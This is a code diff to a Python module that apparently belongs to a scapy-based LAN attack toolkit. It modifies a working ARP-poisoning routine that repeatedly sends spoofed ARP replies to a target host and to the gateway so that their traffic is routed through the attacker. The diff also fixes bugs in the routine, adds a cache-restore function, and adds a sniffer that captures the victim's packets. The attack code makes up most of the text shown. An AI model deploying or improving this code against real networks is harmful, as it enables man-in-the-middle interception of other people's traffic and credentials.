@@ -1,6 +1,6 @@
 import argparse
 import time
-from scapy.all import ARP, Ether, srp, send, sniff, conf
+from scapy.all import ARP, Ether, srp, sendp, sniff, conf
 from cmd2 import argparse_completer
 from wisec.common import shorts, lan, gateway
 from functools import total_ordering
@@ -99,7 +99,6 @@ def handler(args):
         print('\n'.join(map(str, sorted(hosts.values()))))
     elif args.cmd == 'poison':
         if args.poison == 'start':
-            print('Starting arp poisoning')
             start_poison(args.target, args.gateway)
         elif args.poison == 'stop':
             stop_poison()
@@ -112,17 +111,21 @@ def handler(args):
 pthread = None
 def poison_proc(t, g):
     while pthread is not None:
-        send(ARP(op=ARP.is_at, pdst=g.ip, hwdst=g.mac, psrc=t.ip))
-        send(ARP(op=ARP.is_at, pdst=t.ip, hwdst=t.mac, psrc=g.ip))
-        time.sleep(2)
+        sendp(Ether() /
+              ARP(op=ARP.is_at, pdst=g.ip, hwdst=g.mac, psrc=t.ip))
+        sendp(Ether() /
+              ARP(op=ARP.is_at, pdst=t.ip, hwdst=t.mac, psrc=g.ip))
+        time.sleep(1)
 
 
 def poison_restore(t, g):
     f = "ff:ff:ff:ff:ff:ff"
-    send(ARP(op=ARP.is_at, hwdst=f, pdst=g.ip, hwsrc=t.mac, psrc=t.ip),
-         count=5)
-    send(ARP(op=ARP.is_at, hwdst=f, pdst=t.ip, hwsrc=g.mac, psrc=g.ip),
-         count=5)
+    sendp(Ether() /
+          ARP(op=ARP.is_at, hwdst=f, pdst=g.ip, hwsrc=t.mac, psrc=t.ip),
+          count=5)
+    sendp(Ether() /
+          ARP(op=ARP.is_at, hwdst=f, pdst=t.ip, hwsrc=g.mac, psrc=g.ip),
+          count=5)
 
 
 ptarget = None
@@ -138,8 +141,12 @@ def start_poison(target, gateway):
 
     if t is None:
         print("Unable to find target")
+        return
     if g is None:
         print("Unable to find gateway")
+        return
+
+    print(f'Poisoning {t} with gateway {g}')
 
     stop_poison()
     pthread = Thread(target=poison_proc, args=(t, g))
@@ -151,8 +158,9 @@ def start_poison(target, gateway):
 def stop_poison():
     global pthread, ptarget, pgateway
     if pthread:
+        tmp = pthread
         pthread = None
-        pthread.join()
+        tmp.join()
         poison_restore(ptarget, pgateway)
         ptarget = None
         pgateway = None
@@ -160,11 +168,13 @@ def stop_poison():
 
 def sniff_poison():
     global ptarget
-    filter = f'ip host {ptarget.ip}'
-    conf.verb = 10
-    packets = sniff(filter=filter)
-    conf.verb = 0
+    fltr='ip host ' + ptarget.ip
+    packets = sniff(filter=fltr)
     print(packets)
+
+
+def fin():
+    stop_poison()
 
 
 # Arp
